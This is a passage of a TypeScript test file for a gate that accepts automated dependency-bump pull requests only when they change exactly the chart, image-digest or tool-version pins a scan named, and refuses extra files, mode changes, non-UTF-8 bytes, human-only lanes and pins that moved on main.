      `${PROMETHEUS}:6 is \`targetRevision: 29.30.0\` where the scan's moves make \`targetRevision: 29.47.2\``,
    );
    expect(reasonOf(await prove(change({ [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '29.48.0') })))).toContain(
      '29.47.2',
    );
  });

  it('refuses a digest the scan did not read from the registry, at the scan’s own tag too (N3)', async () => {
    const other = swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.7-alpine3.24@${D_OTHER}`);
    expect(reasonOf(await prove(change({ [POSTGRES]: other })))).toContain(
      `where the scan's moves make \`image: postgres:18.7-alpine3.24@${D_NEW}\``,
    );
    const kept = swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.6-alpine3.24@${D_NEW}`);
    expect(reasonOf(await prove(change({ [POSTGRES]: kept })))).toContain(`${POSTGRES}:3 is`);
  });

  it('refuses anything beyond its pins: another line, the pin’s line written otherwise, another file (N4)', async () => {
    const moved = swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.7-alpine3.24@${D_NEW}`);
    expect(reasonOf(await prove(change({ [POSTGRES]: moved.replace('name: postgres', 'name: postgres2') })))).toBe(
      `${POSTGRES}:4 is \`name: postgres2\` where the scan's moves make \`name: postgres\``,
    );
    const spaced = moved.replace('image: postgres', 'image:  postgres');
    expect(reasonOf(await prove(change({ [POSTGRES]: spaced })))).toContain(`${POSTGRES}:3 is`);
    expect(reasonOf(await prove(change({ [POSTGRES]: `${moved}# and a line\n` })))).toBe(
      `${POSTGRES}:5 is \`# and a line\` where the scan's moves make an empty line`,
    );
    // Another registry's copy of the image, at the scan's tag and digest.
    const copy = swap(
      POSTGRES,
      `postgres:18.6-alpine3.24@${D_OLD}`,
      `ghcr.io/someone/postgres:18.7-alpine3.24@${D_NEW}`,
    );
    expect(reasonOf(await prove(change({ [POSTGRES]: copy })))).toContain(`${POSTGRES}:3 is`);
    const elsewhere = change({ [POSTGRES]: moved, 'apps/factory/src/main.ts': 'changed\n' });
    expect(reasonOf(await prove(elsewhere))).toBe(
      'apps/factory/src/main.ts:1 changes, and no move it carries writes apps/factory/src/main.ts',
    );
  });

  it('refuses a move made in part: one Application of two left unmoved', async () => {
    expect(reasonOf(await prove(change({ [OTEL]: swap(OTEL, '0.174.0', '0.178.3') })))).toBe(
      `it leaves ${POD_LOGS} unmoved, which the moves it carries write`,
    );
  });

  it('refuses a file added, deleted, renamed or changed in mode, and anything under .github/ (N4)', async () => {
    const moved = { [POSTGRES]: swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.7-alpine3.24@${D_NEW}`) };
    const added = change(moved, [{ path: 'deploy/x.yaml', status: 'A', head: 'x' }]);
    expect(reasonOf(await prove(added))).toContain('is added');
    const deleted = change(moved, [{ path: 'deploy/x.yaml', status: 'D', base: 'x' }]);
    expect(reasonOf(await prove(deleted))).toContain('is deleted');
    const mode = change(moved).map((file) => ({ ...file, modes: ['100644', '100755'] as [string, string] }));
    expect(reasonOf(await prove(mode))).toContain('changes its mode');
    const link = change(moved).map((file) => ({ ...file, modes: ['120000', '120000'] as [string, string] }));
    expect(reasonOf(await prove(link))).toContain('not a regular file');
    const workflow = change(moved, [{ path: '.github/workflows/check.yml', base: 'a', head: 'b' }]);
    expect(reasonOf(await prove(workflow))).toContain('no move is made under .github/');
  });

  it('refuses a file whose bytes are not UTF-8 on either side, whatever else it carries (S-M2)', async () => {
    const moved = { [POSTGRES]: swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.7-alpine3.24@${D_NEW}`) };
    for (const [base, head] of [
      [null, null],
      ['png', null],
      [null, 'png'],
    ] as const) {
      const binary = change(moved, [{ path: 'apps/console/public/icon.png', base, head }]);
      expect(reasonOf(await prove(binary))).toBe(
        'apps/console/public/icon.png is not UTF-8 text, and a move writes text alone',
      );
    }
  });

  it('reads text from bytes strictly: different invalid bytes are no text, and a mark at the start is kept', () => {
    // Leniently, both read as `A\uFFFDB`, and would compare the same.
    expect(new TextDecoder().decode(Uint8Array.of(0x41, 0x80, 0x42))).toBe(
      new TextDecoder().decode(Uint8Array.of(0x41, 0xff, 0x42)),
    );
    expect(exactText(Uint8Array.of(0x41, 0x80, 0x42))).toBeNull();
    expect(exactText(Uint8Array.of(0x41, 0xff, 0x42))).toBeNull();
    expect(exactText(Uint8Array.of(0xef, 0xbb, 0xbf, 0x41))).toBe('\uFEFFA');
    expect(exactText(new TextEncoder().encode('image: postgres\n'))).toBe('image: postgres\n');
  });

  it('is no move at all where it touches no pin of the scan’s, or changes nothing', async () => {
    expect(await prove([modified('src/app.ts', 'a', 'b')])).toEqual({
      none: 'src/app.ts:1 is no pin of a move the scan of main asked for',
    });
    expect(await prove([])).toEqual({ none: 'it changes no file' });
  });

  it('refuses an image of ours, which passes only as an exact pin (N5)', async () => {
    const ours = 'deploy/base/factory/factory.yaml';
    const scan = [
      move({
        name: 'ghcr.io/the-roganator/cv-software-factory/factory',
        pins: [{ file: ours, line: 1 }],
        from: 'main',
        to: `image main@${D_NEW}`,
      }),
    ];
    const reference = 'image: ghcr.io/the-roganator/cv-software-factory/factory:main@';
    const changed = [modified(ours, `${reference}${D_OLD}`, `${reference}${D_NEW}`)];
    expect(reasonOf(await proveMove(changed, scan, io(), false))).toContain('passes only as an exact pin');
  });

  it('is no move where the pin’s line on main is no longer what the scan read', async () => {
    const shifted: Record<string, string> = { ...MAIN, [PROMETHEUS]: `# a new first line\n${MAIN[PROMETHEUS]}` };
    const head = (shifted[PROMETHEUS] as string).replace('29.35.0', '29.47.2');
    const changed = [modified(PROMETHEUS, shifted[PROMETHEUS] as string, head)];
    expect(reasonOf(await proveMove(changed, SCAN, { base: (path) => shifted[path], derive: step() }, false))).toBe(
      `${PROMETHEUS}:7 is no pin of a move the scan of main asked for`,
    );
  });
});

describe('a move the scan gave to no one to make', () => {
  const grpc = { [LOCK]: lockfile('1.14.7', '7.6.5'), 'package.json': swap('package.json', '1.14.5', '1.14.7') };
  const postgres = change({ [POSTGRES]: swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.7-alpine3.24@${D_NEW}`) });
  const laned = (lane: ScanMove['lane']) => SCAN.map((m) => (m.name === 'postgres' ? { ...m, lane } : m));

  it('refuses a benched package’s fix, exactly the scan’s bump though it is: it waits for Martin’s bench run', async () => {
    const [first, ...rest] = APP_SCAN as [ScanMove, ...ScanMove[]];
    const benched: ScanMove[] = [{ ...first, lane: 'issue', bench: true }, ...rest];
    const asked: PinStepMove[][] = [];
    const result = await proveApp(change(grpc), step(asked), benched);
    expect(result).toEqual({ reason: expect.stringContaining("waits for Martin's bench run") });
    expect(reasonOf(result)).not.toContain('grpc');
    // Refused before the pin step runs; the day's other move is made as ever.
    expect(asked).toEqual([]);
    expect(await proveApp(change({ [LOCK]: lockfile('1.14.5', '7.6.6') }), step(), benched)).toMatchObject({
      rule: 'move',
    });
  });

  it('refuses a move in the lane `issue` or `none`, and whatever else the pull request carries with it', async () => {
    for (const lane of ['issue', 'none'] as const) {
      const result = await prove(postgres, laned(lane));
      expect(result).toEqual({
        reason: `postgres is in the scan's lane \`${lane}\`, which no one makes unattended: it waits for Martin`,
      });
    }
    const both = change({
      [POSTGRES]: swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.7-alpine3.24@${D_NEW}`),
      [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '29.47.2'),
    });
    expect(await prove(both, laned('issue'))).toMatchObject({ reason: expect.stringContaining('waits for Martin') });
  });

  it('makes the lanes the App and the line make: `worker`, `cluster` and `line`', async () => {
    for (const lane of ['worker', 'cluster', 'line'] as const)
      expect(await prove(postgres, laned(lane))).toMatchObject({ rule: 'move' });
  });
});

describe('a move is written only on the pin the scan named', () => {
  const FILE = 'deploy/a.yaml';
  const D_BETA = digest('d');
  const MOVED = /main moved since the scan/;
  const one = (base: string, head: string, scan: ScanMove[], over: Partial<MoveIO> = {}, rewrites?: number[]) =>
    proveMove(
      [{ ...modified(FILE, base, head), rewrites }],
      scan,
      { base: (path) => (path === FILE ? base : undefined), derive: step(), ...over },
      false,
    );

  it('refuses an image’s move where its line on main now holds another image at the same tag', async () => {
    // The scan read alpha on line 2, under a comment main has since lost: its line 2 is beta's now.
    const base = `image: docker.io/library/alpha:v1.2.3@${D_OLD}\nimage: docker.io/library/beta:v1.2.3@${D_BETA}\nreplicas: 1\n`;
    const head = base.replace(`beta:v1.2.3@${D_BETA}`, `beta:v1.2.4@${D_NEW}`);
    const alpha = move({
      name: 'docker.io/library/alpha',
      pins: [{ file: FILE, line: 2 }],
      from: 'v1.2.3',
      to: `image v1.2.4@${D_NEW}`,
    });
    const scanned = [{ image: `docker.io/library/alpha:v1.2.3@${D_OLD}`, pin: { file: FILE, line: 2 } }];
    for (const over of [{}, { scanned }]) {
      const said = reasonOf(await one(base, head, [alpha], over, [2]));
      expect(said).toBe(
        `the gate cannot make docker.io/library/alpha on main: ${FILE}:2 is not docker.io/library/alpha's pin at v1.2.3${'scanned' in over ? `@${D_OLD}` : ''} now: main moved since the scan`,
      );
    }
    // On its own line still, it is the move.
    const own = base.replace(`alpha:v1.2.3@${D_OLD}`, `alpha:v1.2.4@${D_NEW}`);
    expect(await one(base, own, [{ ...alpha, pins: [{ file: FILE, line: 1 }] }], {}, [1])).toMatchObject({
      rule: 'move',
    });
  });

  it('refuses it where the line pins the image at another digest than the scan read there', async () => {
    const base = `image: postgres:18.6-alpine3.24@${D_OTHER}\n`;
    const head = `image: postgres:18.7-alpine3.24@${D_NEW}\n`;
    const postgres = move({
      name: 'postgres',
      pins: [{ file: FILE, line: 1 }],
      from: '18.6-alpine3.24',
      to: `image 18.7-alpine3.24@${D_NEW}`,
    });
    const at = (image: string) => ({ scanned: [{ image, pin: { file: FILE, line: 1 } }] });
    expect(reasonOf(await one(base, head, [postgres], at(`postgres:18.6-alpine3.24@${D_OLD}`)))).toMatch(MOVED);
    expect(await one(base, head, [postgres], at(`postgres:18.6-alpine3.24@${D_OTHER}`))).toMatchObject({
      rule: 'move',
    });
    // Another image the scan read at that pin says nothing of this one's digest.
    expect(await one(base, head, [postgres], at(`redis:18.6-alpine3.24@${D_OLD}`))).toMatchObject({ rule: 'move' });
  });

  it('knows a chart’s image, whose value writes its tag alone, by the digest the scan read there', async () => {
    // Kyverno's values: every image at one tag, each known by its digest alone.
    const values = `a:\n  tag: v1.19.1@${D_OLD}\nb:\n  tag: v1.19.1@${D_BETA}\n`;
    const kyverno = (line: number) =>
      move({
        name: 'kyverno: reg.kyverno.io/kyverno/kyverno',
        pins: [{ file: FILE, line }],
        from: 'v1.19.1',
        to: `image v1.20.0@${D_NEW}`,
      });
    const scanned = (line: number) => ({
      scanned: [{ image: `reg.kyverno.io/kyverno/kyverno:v1.19.1@${D_OLD}`, pin: { file: FILE, line } }],
    });
    const first = values.replace(`v1.19.1@${D_OLD}`, `v1.20.0@${D_NEW}`);
    expect(await one(values, first, [kyverno(2)], scanned(2))).toMatchObject({ rule: 'move' });
    // The scan read it on line 4, which main has since given the other image: not written there.
    const second = values.replace(`v1.19.1@${D_BETA}`, `v1.20.0@${D_NEW}`);
    expect(reasonOf(await one(values, second, [kyverno(4)], scanned(4)))).toMatch(MOVED);
    // With no digest of the scan's to know it by, a tag alone is no one's pin.
    expect(reasonOf(await one(values, first, [kyverno(2)]))).toMatch(MOVED);
  });

  it('refuses a chart’s move where its line is another chart’s `targetRevision`, at the same version', async () => {
    const two = `${application('loki', '1.2.3')}---\n${application('tempo', '1.2.3')}`;
    const lines = two.split('\n');
    const [loki, tempo] = [lines.indexOf('      chart: loki') + 2, lines.indexOf('      chart: tempo') + 2];
    const chart = (line: number) =>
      move({ name: 'loki', pins: [{ file: FILE, line }], from: '1.2.3', to: 'chart loki 1.2.4' });
    const at = (line: number) => lines.map((each, i) => (i === line - 1 ? each.replace('1.2.3', '1.2.4') : each));
    expect(await one(two, at(loki).join('\n'), [chart(loki)])).toMatchObject({ rule: 'move' });
    expect(reasonOf(await one(two, at(tempo).join('\n'), [chart(tempo)]))).toBe(
      `the gate cannot make loki on main: ${FILE}:${tempo} is not loki's pin at 1.2.3 now: main moved since the scan`,
    );
    expect(chartPinAt(lines, loki, 'loki', '1.2.3')).toBe(true);
    expect(chartPinAt(lines, loki, 'loki', '1.2.4')).toBe(false);
    expect(chartPinAt(lines, tempo, 'loki', '1.2.3')).toBe(false);
    // One Application with two charts at one version: each chart's pin is the revision nearest its own `chart:`.
    const sources = [
      '    - chart: loki',
      '      targetRevision: 1.2.3',
      '    - chart: tempo',
      '      targetRevision: 1.2.3',
    ];
    expect(chartPinAt(sources, 2, 'loki', '1.2.3')).toBe(true);
    expect(chartPinAt(sources, 4, 'loki', '1.2.3')).toBe(false);
    // The Makefile installs one chart, at the version its variable holds.
    expect(chartPinAt(['ARGOCD_CHART := 10.20.0'], 1, 'argo-cd', '10.20.0')).toBe(true);
  });

  it('refuses two moves that name one line: neither is the one move of that pin', async () => {
    const base = `image: docker.io/library/alpha:v1.2.3@${D_OLD}\n`;
    const head = `image: docker.io/library/alpha:v1.2.4@${D_NEW}\n`;
    const alpha = move({
      name: 'docker.io/library/alpha',
      pins: [{ file: FILE, line: 1 }],
      from: 'v1.2.3',
      to: `image v1.2.4@${D_NEW}`,
    });
    expect(await one(base, head, [alpha])).toMatchObject({ rule: 'move' });
    for (const other of [{ ...alpha, name: 'docker.io/library/beta' }, { ...alpha }])
      expect(reasonOf(await one(base, head, [alpha, other]))).toBe(
        `docker.io/library/alpha and ${other.name} both name ${FILE}:1, and neither is the one move of that pin`,
      );
  });

  it('refuses a tool’s move where its line in mise.lock is another entry’s, or another version', async () => {
    const lock = '[[tools.k3d]]\nversion = "5.8.3"\n\n[[tools.kubectl]]\nversion = "5.8.3"\n';
    const made = lock.replace('"5.8.3"', '"5.9.0"');
    const proxy = (line: number) =>
      move({
        name: 'ghcr.io/k3d-io/k3d-proxy',
        pins: [{ file: 'mise.lock', line }],
        from: '5.8.3',
        to: `image 5.9.0@${D_NEW}`,
      });
    const tool = (name: string, line: number) =>
      move({ name, pins: [{ file: 'mise.lock', line }], from: '5.8.3', to: `tool ${name} 5.9.0` });
    const prove = (scan: ScanMove[], base = lock, head = made, rewrites = [2]) =>
      proveMove(
        [{ ...modified('mise.lock', base, head), rewrites }],
        scan,
        {
          base: (path) => (path === 'mise.lock' ? base : undefined),
          derive: async () => new Map([['mise.lock', made]]),
        },
        false,
      );
    expect(await prove([proxy(2)])).toMatchObject({ rule: 'move' });
    expect(await prove([tool('k3d', 2)])).toMatchObject({ rule: 'move' });
    // Line 5 is kubectl's version now: the step would move kubectl as if it were k3d.
    const stray = lock.replace(/"5\.8\.3"\n$/, '"5.9.0"\n');
    for (const scan of [[proxy(5)], [tool('k3d', 5)]])
      expect(reasonOf(await prove(scan, lock, stray, [5]))).toBe(
        `the gate cannot make ${scan[0]?.name}: mise.lock:5 is not ${scan[0]?.name}'s pin at 5.8.3 now: main moved since the scan`,
      );
    // The entry's own, at a version the scan did not read.
    const later = lock.replace('"5.8.3"', '"5.8.4"');
    expect(reasonOf(await prove([tool('k3d', 2)], later, made))).toMatch(MOVED);
  });
});

describe('git’s lists', () => {
  it('reads each raw entry’s modes, status and path, a tab in the path kept', () => {
    const raw = `:100644 100755 ${'a'.repeat(40)} ${'b'.repeat(40)} M\tdeploy/a\tb.yaml\n:000000 100644 ${'0'.repeat(40)} ${'c'.repeat(40)} A\tnew.yaml\n`;
    expect(rawEntries(raw)).toEqual([
      { path: 'deploy/a\tb.yaml', status: 'M', modes: ['100644', '100755'] },
      { path: 'new.yaml', status: 'A', modes: ['000000', '100644'] },
    ]);
  });

  it('reads the lines of main’s text each hunk rewrites or removes, and the line an insertion follows', () => {
    expect(hunkLines('@@ -3 +3 @@\n-a\n+b\n@@ -10,2 +10,0 @@\n@@ -20,0 +19,4 @@\n@@ -0,0 +1 @@\n')).toEqual([
      3, 10, 11, 20, 1,
    ]);
  });
});
